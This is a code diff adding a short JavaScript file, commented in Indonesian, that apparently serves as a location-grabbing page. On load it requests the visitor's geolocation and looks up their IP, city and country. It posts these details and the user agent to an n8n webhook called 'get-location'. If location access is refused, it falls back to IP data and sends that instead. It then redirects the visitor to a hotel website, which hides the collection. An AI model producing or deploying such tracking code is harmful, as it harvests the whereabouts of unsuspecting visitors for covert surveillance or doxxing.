@@ -1,0 +1,51 @@
+async function sendLocation(position) {
+  const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+  const payload = {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    ip: ipData.ip,
+    city: ipData.city,
+    region: ipData.region,
+    country: ipData.country_name,
+    userAgent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+  };
+
+  await fetch("https://jdika5914.app.n8n.cloud/webhook-test/get-location", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+
+  // Redirect setelah data dikirim
+  window.location.href = "https://juliandika5914.github.io/Lotus-Hotel/";
+}
+
+function handleError(error) {
+  // Kalau user tolak izin lokasi, fallback ke IP-based
+  fetch("https://ipapi.co/json")
+    .then(r => r.json())
+    .then(ipData => fetch("https://jdika5914.app.n8n.cloud/webhook-test/get-location", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        latitude: null,
+        longitude: null,
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country_name,
+        userAgent: navigator.userAgent,
+        error: error.message,
+        timestamp: new Date().toISOString()
+      })
+    }))
+    .finally(() => window.location.href = "https://juliandika5914.github.io/Lotus-Hotel/");
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+} else {
+  handleError({ message: "Geolocation not supported" });
+}
